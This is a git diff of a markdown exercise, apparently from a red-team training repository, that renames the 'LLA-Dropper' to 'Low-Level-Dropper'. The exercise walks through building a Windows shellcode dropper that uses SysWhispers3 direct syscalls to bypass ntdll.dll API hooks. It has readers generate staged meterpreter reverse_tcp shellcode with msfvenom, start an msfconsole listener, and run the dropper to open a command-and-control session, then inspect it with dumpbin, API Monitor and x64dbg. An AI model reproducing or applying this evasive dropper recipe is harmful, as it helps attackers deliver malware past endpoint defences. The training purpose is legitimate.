@@ -1,23 +1,23 @@
 ## Exercise 5: Low_Level_API_Dropper
-In this exercise, we will make the second modification to the reference dropper, create the direct syscall dropper, and implement the required syscalls or syscall stub directly into the **Low-Level API shellcode dropper** for short **LLA dropper**. 
+In this exercise, we will make the second modification to the reference dropper, create the direct syscall dropper, and implement the required syscalls or syscall stub directly into the **Low-Level API shellcode dropper** for short **Low-Level-Dropper**. 
 ![low_level_dropper_principal](https://user-images.githubusercontent.com/50073731/235438881-e4af349a-0109-4d8e-80e2-730915c927f6.png)
 
 ## Exercise 5 tasks:
-### Create LLA-Dropper 
-1. Create necessary code for LLA-Dropper with SysWhispers3
-1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the LLA-Dropper.
-2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ LLA-Dropper poc. 
-3. Compile the LLA-Dropper as release or debug x64. 
+### Create Low-Level-Dropper 
+1. Create necessary code for Low-Level-Dropper with SysWhispers3
+1. Create a new C++ POC in Visual Studio 2019 and use the provided code for the Low-Level-Dropper.
+2. Create staged x64 meterpreter shellcode with msfvenom and copy it to the C++ Low-Level-Dropper poc. 
+3. Compile the Low-Level-Dropper as release or debug x64. 
 4. Create and run a staged x64 meterpreter listener with msfconsole.
 5. Run your compiled .exe and verify that a stable command and control channel opens. 
-### Analyse HLA-Dropper
-6. Use the Visual Studio tool dumpbin to analyze the compiled LLA-Dropper. Is the result what you expected?  
-7. Use the API Monitor to analyze the compiled LLA-Dropper in the context of the four APIs used. Is the result what you expected? 
-8. Use the x64dbg debugger to analyze the compiled LLA dropper: from which module and location are the syscalls from the four APIs used being executed?
+### Analyse Low-Level-Dropper
+6. Use the Visual Studio tool dumpbin to analyze the compiled Low-Level-Dropper. Is the result what you expected?  
+7. Use the API Monitor to analyze the compiled Low-Level-Dropper in the context of the four APIs used. Is the result what you expected? 
+8. Use the x64dbg debugger to analyze the compiled Low-Level-Dropper: from which module and location are the syscalls from the four APIs used being executed?
 Is the result what you expected? 
 
 ## SysWhispers 3
-Again, we need to implement the code for the four native APIs we use, but unlike the Medium_Level dropper, we do not load the corresponding syscalls from ntdll.dll. Instead, we want to implement the necessary code directly in our LLA dropper. Therefore we have to create the corresponding code or files with the tool SysWhispers3 from [**@KlezVirus**](https://twitter.com/KlezVirus). To create the necessary code in context of our LLA-Dropper you can use the following command with SysWhispers. Because we work with the MSVC compiler in Visual Studio we choose for the -c parameter msvc. 
+Again, we need to implement the code for the four native APIs we use, but unlike the Medium_Level dropper, we do not load the corresponding syscalls from ntdll.dll. Instead, we want to implement the necessary code directly in our Low-Level-Dropper. Therefore we have to create the corresponding code or files with the tool SysWhispers3 from [**@KlezVirus**](https://twitter.com/KlezVirus). To create the necessary code in context of our Low-Level-Dropper you can use the following command with SysWhispers. Because we work with the MSVC compiler in Visual Studio we choose for the -c parameter msvc. 
 <details>
     
 **kali>**
@@ -26,7 +26,7 @@ python syswhispers.py -a x64 -c msvc -f NtAllocateVirtualMemory,NtWriteVirtualMe
 ```
 </details>
 
-SysWhispers3 creates for us the three files **syscalls.h**, **syscalls.c** and **syscalls-asm.x64.asm**, which we later implement in our LLA-Dropper and which represent the code for the direct syscall implementation. 
+SysWhispers3 creates for us the three files **syscalls.h**, **syscalls.c** and **syscalls-asm.x64.asm**, which we later implement in our Low-Level-Dropper and which represent the code for the direct syscall implementation. 
 <details>
  
 <p align="center">
@@ -36,7 +36,7 @@ SysWhispers3 creates for us the three files **syscalls.h**, **syscalls.c** and *
 
 
 ## Visual Studio
-To create the LLA-Dropper project, follow the procedure of the high-level API dropper exercise, take a look to follow the necessary steps.
+To create the Low-Level-Dropper project, follow the procedure of the high-level API dropper exercise, take a look to follow the necessary steps.
 The code works as follows, shellcode declaration is the same as before in both droppers.
 <details>
 
@@ -47,10 +47,10 @@ The code works as follows, shellcode declaration is the same as before in both d
 </details>
 
 
-In the case of the LLA-Dropper, we also need to access the syscalls or syscalls stub from the respective native APIs. Again, we use the same native APIs as in the MLA-Dropper. 
-But this time we do not want to run/import the syscalls from ntdll.dll and instead want to implement the functionality directly in the LLA-Dropper itself, we have to import the generated files/code from SysWhispers 3 into our LLA-Dropper. The syscalls.h provides the structure of the used native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject and the syscalls-asm.x64.asm contains the corresponding syscalls or syscall stubs. This allows the LLA dropper to execute syscalls directly without the transition from dropper.exe -> kernel32.dll -> ntdll.dll. Practically, we need to implement the generated code with SysWhispers 3 as follows: 
+In the case of the Low-Level-Dropper, we also need to access the syscalls or syscalls stub from the respective native APIs. Again, we use the same native APIs as in the Medium-Level-Dropper. 
+But this time we do not want to run/import the syscalls from ntdll.dll and instead want to implement the functionality directly in the Low-Level-Dropper itself, we have to import the generated files/code from SysWhispers 3 into our Low-Level-Dropper. The syscalls.h provides the structure of the used native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject and the syscalls-asm.x64.asm contains the corresponding syscalls or syscall stubs. This allows the Low-Level-Dropper to execute syscalls directly without the transition from dropper.exe -> kernel32.dll -> ntdll.dll. Practically, we need to implement the generated code with SysWhispers 3 as follows: 
 
-1. Copy all three files we created with SysWhispers 3 into the directory of your LLA-Dropper Visual Studio project.
+1. Copy all three files we created with SysWhispers 3 into the directory of your Low-Level-Dropper Visual Studio project.
 <details>
  
 <p align="center">
@@ -58,7 +58,7 @@ But this time we do not want to run/import the syscalls from ntdll.dll and inste
 </details>
 
     
-2. Add the syscalls.h file to your LLA-Dropper project as a header file. 
+2. Add the syscalls.h file to your Low-Level-Dropper project as a header file. 
 <details>
  
 <p align="center">
@@ -98,7 +98,7 @@ Customisations.
 <img width="590" alt="image" src="https://user-images.githubusercontent.com/50073731/235457782-780d2136-30d7-4e87-a022-687ed2557b33.png">
 </details>
 
-7. Then we need to set the Item Type of the syscalls-asm.x64.asm file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in our LLA dropper. 
+7. Then we need to set the Item Type of the syscalls-asm.x64.asm file to Microsoft Macro Assembler, otherwise we will get an unresolved symbol error in the context of the native APIs used in our Low-Level-Dropper. 
 <details>
  
 <p align="center">
@@ -108,8 +108,8 @@ Customisations.
     
 </details>
 
-Here is the **complete code**, and you can copy and paste this code into your **LLA-Dropper** project in Visual Studio.
-You can also download the complete **LLA-Dropper Visual Studio project** in the **Code Example section** of this repository.
+Here is the **complete code**, and you can copy and paste this code into your **Low-Level-Dropper** project in Visual Studio.
+You can also download the complete **Low-Level-Dropper Visual Studio project** in the **Code Example section** of this repository.
 <details>
     
 ```
@@ -161,14 +161,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IPv4_Redirector_or_IPv4_Ka
 <img width="696" alt="image" src="https://user-images.githubusercontent.com/50073731/235358025-7267f8c6-918e-44e9-b767-90dbd9afd8da.png">
 </p>
 
-The shellcode can then be copied into the LLA-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
+The shellcode can then be copied into the Low-Level-Dropper poc by replacing the placeholder at the unsigned char, and the poc can be compiled as an x64 release.<p align="center">
 <img width="479" alt="image" src="https://user-images.githubusercontent.com/50073731/235414557-d236582b-5bab-4754-bd12-5f7817660c3a.png">
 </p>
 </details>    
 
 
 ## MSF-Listener
-Before we test the functionality of our LLA-Dropper, we need to create a listener within msfconsole.
+Before we test the functionality of our Low-Level-Dropper, we need to create a listener within msfconsole.
 <details>
     
 **kali>**
@@ -190,7 +190,7 @@ run
 </details>
  
     
-Once the listener has been successfully started, you can run your compiled LLA-Dropper.exe. If all goes well, you should see an incoming command and control session. 
+Once the listener has been successfully started, you can run your compiled Low-Level-Dropper.exe. If all goes well, you should see an incoming command and control session. 
 <details>
     
 <p align="center">
@@ -200,7 +200,7 @@ Once the listener has been successfully started, you can run your compiled LLA-D
         
 
     
-## LLA-Dropper analysis: dumpbin 
+## Low-Level-Dropper analysis: dumpbin 
 The Visual Studio tool dumpbin can be used to check which Windows APIs are imported via kernel32.dll. The following command can be used to check the imports. Which results do you expect?
 <details>    
     
@@ -221,8 +221,8 @@ dumpbin /imports high_level.exe
 </details>   
     
     
-## LLA-Dropper analysis: API-Monitor
-For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in the context of the used APIs in our MLA dropper. We filter on the following API calls:
+## Low-Level-Dropper analysis: API-Monitor
+For a correct check, it is necessary to filter to the correct APIs. Only by providing the correct Windows APIs and the corresponding native APIs, we can be sure that there are no more transitions in the context of the used APIs in our Medium-Level-Dropper. We filter on the following API calls:
 - VirtualAlloc
 - NtAllocateVirtualMemory
 - WriteProcessMemory
@@ -234,28 +234,28 @@ For a correct check, it is necessary to filter to the correct APIs. Only by prov
 
 <details>
     <summary>Solution</summary>    
-If everything was done correctly, you could see that the four used Windows APIs and their native APIs are no longer imported from kernel32.dll and ntdll.dll to the LLA-Dropper.exe.
-This result was expected and is correct because our LLA dropper has directly implemented the necessary syscalls or syscall stubs for the respective native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject.
+If everything was done correctly, you could see that the four used Windows APIs and their native APIs are no longer imported from kernel32.dll and ntdll.dll to the Low-Level-Dropper.exe.
+This result was expected and is correct because our Low-Level-Dropper has directly implemented the necessary syscalls or syscall stubs for the respective native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject.
 <p align="center">
 <img width="595" alt="image" src="https://user-images.githubusercontent.com/50073731/235480936-df805736-aad8-44a7-8bec-f8563735d1d2.png">
 </p>
 </details>    
 
-## LLA-Dropper analysis: x64dbg 
+## Low-Level-Dropper analysis: x64dbg 
 Using x64dbg we want to validate from which module and location the respective system calls are executed in the context of the used Windows APIs -> native APIs?
 Remember, now we have not implemented system calls or system call stubs directly in the dropper. What results would you expect?
 <details>
     <summary>Solution</summary>
     
-1. Open or load your LLA-Dropper.exe into x64dbg
-2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight your **LLA-Dropper.exe**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. Compared to the HLA-Dropper and the MLA-Dropper we can see that the symbols for the used native APIs are implemented directly in the dropper itself and not imported from the ntdll.dll.
+1. Open or load your Low-Level-Dropper.exe into x64dbg
+2. Go to the Symbols tab, in the **left pane** in the **Modules column** select or highlight your **Low-Level-Dropper.exe**, in the **right pane** in the **Symbols column** filter for the first native API **NtAllocateVirtualMemory**, right click and **"Follow in Dissassembler"**. To validate the other three native APIs, NtWriteVirtualMemory, NtCreateThreadEx and NtWaitForSingleObject, just **repeat this procedure**. Compared to the High-Level-Dropper and the Medium-Level-Dropper we can see that the symbols for the used native APIs are implemented directly in the dropper itself and not imported from the ntdll.dll.
     
 <p align="center">    
 <img width="979" alt="image" src="https://user-images.githubusercontent.com/50073731/235481553-012459f5-1284-44ed-b3ed-2b04bfcccd3b.png">
 </p>
     
 As expected, we can observe that the corresponding system calls for the native APIs NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx, NtWaitForSingleObject are no longer 
-imported from the .text section in the ntdll.dll module. Instead the syscalls or syscalls stubs are directly implemtented into the .text section of the LLA-Dropper itself.
+imported from the .text section in the ntdll.dll module. Instead the syscalls or syscalls stubs are directly implemtented into the .text section of the Low-Level-Dropper itself.
     
 <p align="center">    
 <img width="990" alt="image" src="https://user-images.githubusercontent.com/50073731/235482389-35cd8c12-593e-4089-b082-8eaf2ba6636a.png"></p>    
